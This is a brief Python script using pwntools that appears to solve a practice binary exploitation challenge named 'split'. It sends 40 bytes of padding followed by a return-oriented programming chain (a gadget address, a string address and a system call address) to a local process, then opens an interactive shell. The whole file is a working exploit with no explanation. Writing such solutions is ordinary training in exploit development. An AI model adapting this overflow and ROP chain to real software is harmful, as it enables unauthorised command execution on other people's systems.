#!/usr/bin/env python3

from pwn import *

pwn = process("./split")

buf = b'AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE'
buf += p64(0x0000000000400883)
buf += p64(0x00601060)
buf += p64(0x00400810)

pwn.sendline(buf)
pwn.interactive()
